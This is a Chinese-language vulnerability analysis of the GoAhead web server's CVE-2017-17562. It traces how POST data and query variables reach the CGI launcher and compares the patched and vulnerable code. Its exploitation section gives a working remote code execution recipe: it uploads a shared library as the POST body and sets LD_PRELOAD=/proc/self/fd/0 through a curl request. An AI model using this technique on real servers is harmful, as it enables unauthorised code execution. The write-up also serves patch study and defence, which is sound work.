即将请求包中的头解析，并与`HTTP_`拼接成相应的字段存入到`wp`结构中。并根据相应的字段设置`wp->flags`字段，如若请求头中包括`connection:
keep-alive`，则`wp->flags |= WEBS_KEEP_ALIVE`会执行。
解析完请求头后，因为`POC`中为`POST`方法，`wp->rxLen`在`parseHeaders`中被赋值，后续`wp->state`接着被赋值成了`WEBS_CONTENT`，表示还有`content`数据需要接收处理。
后续调用`websRouteRequest`来确定请求包其所对应的处理函数，通过比对`url`路径中是否包含`route->prifix`。`routes`是一个数组，包含了所有的处理函数的相关信息，它解析了`route.txt`，`route.txt`数据部分内容如下，可以看到url中包含`cgi-bin`的话，其对应的`handler`为cgi。
    $ cat route.txt
    #
    #   route.txt - Route configuration
    #
    #   Schema
    #       route uri=URI protocol=PROTOCOL methods=METHODS handler=HANDLER redirect=STATUS@URI \
    #           extensions=EXTENSIONS abilities=ABILITIES
    #
    #   Abilities are a set of required abilities that the user or request must possess.
    #   The abilities, extensions, methods and redirect keywords may use comma separated tokens to express a set of
    #       required options, or use "|" separated tokens for a set of alternative options. This implements AND/OR.
    #   The protocol keyword may be set to http or https
    #   Multiple redirect fields are permissable
    #
    #   Redirect over TLS
    #       route uri=/ protocol=http redirect=https handler=redirect
    #
    #   Form based login pattern
    #       route uri=/login.html
    #       route uri=/action/login methods=POST handler=action redirect=200@/ redirect=401@/login.html
    #       route uri=/action/logout methods=POST handler=action redirect=200@/login.html
    #       route uri=/ auth=form handler=continue redirect=401@/login.html
    route uri=/old-alias/ redirect=/alias/atest.html handler=redirect
    ...
    route uri=/auth/digest/admin/ auth=digest abilities=manage
    ...
    route uri=/auth/form/login.html
    ...
    route uri=/cgi-bin handler=cgi
    ...
    #
    #   Catch-all route without authentication for all other URIs
    #
    route uri=/
经过`websRouteRequest`函数，最终确定使用`cgihandler`（存在漏洞的函数）函数来处理该url请求。解析出来的`wp->route`为如下：
    pwndbg> print *wp->route
    $23 = {
      prefix = 0x555555761fe0 "/cgi-bin",
      prefixLen = 0x8,
      dir = 0x0,
      protocol = 0x0,
      authType = 0x0,
      handler = 0x55555575cc50,
      abilities = 0xffffffff,
      extensions = 0xffffffff,
      redirects = 0xffffffff,
      methods = 0xffffffff,
      askLogin = 0x0,
      parseAuth = 0x0,
      verify = 0x7ffff7b32711 ,
      flags = 0x0
    }
    pwndbg> print *wp->route.handler
    $24 = {
      name = 0x55555575cec0 "cgi",
      match = 0x0,
      service = 0x7ffff7b33bb4 ,
      close = 0x0,
      flags = 0x0
    }
现在整个`POC`中的数据除了最后`POST`的数据都已处理完毕。根据以往的经验知道：`post`数据一般是`cgi`程序的标准输入。通过前面的分析，我们知道在`launchCgi`函数调用`ececve`启动cgi程序的时候，会将标准输入重定向为`tmp`文件句柄，所以接下来应该就是将`post`数据保存到`tmp`文件中。
继续看代码，程序在`websRouteRequest`函数后，判断请求类型，如果为`POST`则调用`websGetCgiCommName()`生成`tmp`文件路径，看下它文件路径生成的规则：
    /*
        Returns a pointer to an allocated qualified unique temporary file name. This filename must eventually be deleted with
        wfree().
     */
    PUBLIC char *websGetCgiCommName()
    {
        return websTempFile(NULL, "cgi");
    }
    PUBLIC char *websTempFile(char *dir, char *prefix)
    {
        static int count = 0;
        char   sep;
        sep = '/';
        if (!dir || *dir == '\0') {
                    ...
    #elif ME_WIN_LIKE
            dir = getenv("TEMP");
            sep = '\\';
                    ...
    #endif
        }
        if (!prefix) {
            prefix = "tmp";
        }
        return sfmt("%s%c%s-%d.tmp", dir, sep, prefix, count++);
    }
可以看到，`tmp`文件路径为`/tmp/tmp-xx.tmp`，`xx`为累计的计数器的值。
接着程序返回到`websPump`中，将调用`processContent`。该函数首先调用`filterChunkData`将剩下未处理的数据保存到`wp`的`input`字段中。然后因为此时`wp->cgifd
>=
0`，调用`websProcessCgiData`函数。该函数将post数据通过`write`函数写入到了相应的tmp文件中，再与`launchCgi`函数中的重定向结合，实现了将post数据作为cgi函数的标准输入。
最后程序执行`websRunRequest`函数，先调用`websSetQueryVars`将`get`请求参数保存到`wp->vars`中，然后调用`(*route->handler->service)(wp)`，即`cgiHandler`函数，与前半部分的分析接上，最终调用cgi程序运行。
至此整个过程分析结束，再将整个`goahead`处理`cgi`所对应`post`请求处理流程小结如下：
  1. 调用`websRead`函数，所有数据保存到了wp->rxbuf中。
  2. 调用`websPump`，该函数包含三部分：
    1. 调用`parseIncoming`函数解析请求头以及调用`websRouteRequest`确定相应的处理函数。
    2. 调用`processContent`将处理post数据，将其保存到tmp文件中。
    3. 调用`websRunRequest`函数，调用相应的处理函数，cgi对应为`cgiHandler`。
  3. 调用`cgiHandler`，将请求头以及get参数设置到环境变量中，调用`launchCgi`函数。
  4. 调用`launchCgi`函数，将标准输出输入重定向到文件句柄，调用`execve`启动cgi进程。
## 漏洞利用
通过分析部分知道了漏洞的成因是没有对传入的数据进行检查，使得最终`execve`启动新进程执行cgi程序时的环境变量`envp`数组可控。
首先是如何利用`envp`环境变量数组，如何通过控制一个进程的环境变量来实现任意代码执行？可以使用`LD_PRELOAD`这个变量，做过pwn题的一般都是使用该变量来预先加载libc来实现加载指定的libc，我们也可以使用该变量来加载执行我们想要的代码。
    #include
    static void demo(void) __attribute__((constructor));
    static void demo(void)
    {
        printf("hello world\n");
    }
使用命令`make DEMO`编译出`demo.so`，执行命令`LD_PRELOAD=./demo.so whoami`测试结果。
    $ LD_PRELOAD=./demo.so whoami
    hello world
    raycp
因此如果我们可以上传文件为so，并指定`LD_PRELOAD`环境变量，即可实现任意代码执行，`LD_PRELOAD`加载的具体原理可看这个[REMOTE
LD_PRELOAD EXPLOITATION](https://www.elttam.com.au/blog/goahead/)。
通过前面的分析可以知道执行`cgi`程序时，会将post数据先保存到一个tmp文件中，再将其重定向到cgi进程的标准输入中，且tmp文件名为`/tmp/tmp-xx.tmp`，因此一种方法是我们可以将so文件作为post参数传给cgi，再爆破tmp文件名，因为是从0开始并累加，还是有一定可行性的。
还有一种方法：`/proc/self/fd/0`是指向自己进程的标准输入的，对于cgi进程来说，它的值因为被重定向到了tmp文件，所以它的`/proc/self/0`也就指向来tmp文件，所以我们可以使用它作为`LD_PRELOAD`的值，无需爆破tmp文件名。
下面进行验证，`valid.c`内容如下，使用`sleep`的原因在于避免进程很快退出，无法查看进程的fd文件：
    #include
    static void valid(void) __attribute__((constructor));
    static void valid(void)
    {
        sleep(100);
    }
运行goahead：
    $ curl -X POST --data-binary @valid.so http://172.16.217.185:80/cgi-bin/cgitest\?LD_PRELOAD\=/proc/self/fd/0
查看cgi进程：
    $ ps -ax | grep cgitest
     38522 pts/6    S+     0:00 /home/raycp/work/iot/goahead/goahead/test/cgi-bin/cgitest
查看进程对应的`/proc/self/fd/0`文件：
    $ sudo ls -l /proc/38522/fd/0
    [sudo] password for raycp:
    lrwx------ 1 root root 64 Aug  6 19:39 /proc/38522/fd/0 -> /tmp/cgi-0.tmp
查看tmp文件，为我们上传的so文件：
    $ file /tmp/cgi-0.tmp
    /tmp/cgi-0.tmp: ELF 64-bit LSB shared object, x86-64, version 1 (SYSV), dynamically linked, BuildID[sha1]=f6c44284417e28152bd71f64f55ab551e56abfaa, not stripped
所以利用的方法为post恶意的so文件过去，并利用`LD_PRELOAD`加载`/proc/self/fd/0`实现so文件的加载。
## 补丁比对
查看goahead是如何patch该漏洞的，先切换到3.6.5：
    git checkout tags/v3.6.5
补丁与漏洞关键代码如下：
    // pathed
    envpsize = 64;
        envp = walloc(envpsize * sizeof(char*));
        for (n = 0, s = hashFirst(wp->vars); s != NULL; s = hashNext(wp->vars, s)) {
            if (s->content.valid && s->content.type == string) {
                if (smatch(s->name.value.string, "REMOTE_HOST") ||
                    smatch(s->name.value.string, "HTTP_AUTHORIZATION") ||
                    smatch(s->name.value.string, "IFS") ||
                    smatch(s->name.value.string, "CDPATH") ||
                    smatch(s->name.value.string, "PATH") ||
                    sstarts(s->name.value.string, "LD_")) {
                    continue;
                }
                if (s->arg != 0 && *ME_GOAHEAD_CGI_VAR_PREFIX != '\0') {
                    envp[n++] = sfmt("%s%s=%s", ME_GOAHEAD_CGI_VAR_PREFIX, s->name.value.string,
                        s->content.value.string);
                } else {
                    envp[n++] = sfmt("%s=%s", s->name.value.string, s->content.value.string);
                }
                trace(0, "Env[%d] %s", n, envp[n-1]);
                if (n >= envpsize) {
                    envpsize *= 2;
                    envp = wrealloc(envp, envpsize * sizeof(char *));
                }
            }
        }
        *(envp+n) = NULL;
    // vulned
    envpsize = 64;
        envp = walloc(envpsize * sizeof(char*));
        for (n = 0, s = hashFirst(wp->vars); s != NULL; s = hashNext(wp->vars, s)) {
            if (s->content.valid && s->content.type == string &&
                strcmp(s->name.value.string, "REMOTE_HOST") != 0 &&
                strcmp(s->name.value.string, "HTTP_AUTHORIZATION") != 0) {
                envp[n++] = sfmt("%s=%s", s->name.value.string, s->content.value.string);
                trace(5, "Env[%d] %s", n, envp[n-1]);
                if (n >= envpsize) {
                    envpsize *= 2;
                    envp = wrealloc(envp, envpsize * sizeof(char *));
                }
            }
        }
        *(envp+n) = NULL;
对比两个版本可以看到补丁中除了`REMOTE_HOST`和`HTTP_AUTHORIZATION`的限制，还加入了一些额外的限制包括限制`LD_`开头，即无法传入`LD_PRELOAD`变量。
这个补丁也是黑名单策略，也还有很大的空间，我们仍然可以控制很多的环境变量。
## 小结
黑名单策略还是容易出现问题，漏洞的利用方式也挺亮眼。
相关脚本和文件[链接](https://github.com/ray-cp/Vuln_Analysis/tree/master/CVE-2017-17562-GoAhead-rce)。
## 参考链接
  1. [CVE-2017-17562 Detail](https://nvd.nist.gov/vuln/detail/CVE-2017-17562)
  2. [REMOTE LD_PRELOAD EXPLOITATION](https://www.elttam.com.au/blog/goahead/)
  3. [开源Web服务器GoAhead漏洞CVE-2017-17562分析](https://slab.qq.com/news/tech/1701.html)
  4. [干货分享|GoAhead服务器远程命令执行漏洞（CVE-2017-17562） 分析报告](https://www.easyaq.com/news/1646990185.shtml)
  5. [有关CVE-2017-17562的一些零碎点](https://kevien.github.io/2017/12/24/CVE-2017-17562的一些零碎点/)
  6. [GOAhead CVE-2017-17562深入分析](https://bbs.pediy.com/thread-223793.htm)
  7. [CVE-2017-17562.py](https://github.com/1337g/CVE-2017-17562/blob/master/CVE-2017-17562.py)
  8. [CVE-2017-17562-exp](https://github.com/elttam/advisories/tree/master/CVE-2017-17562)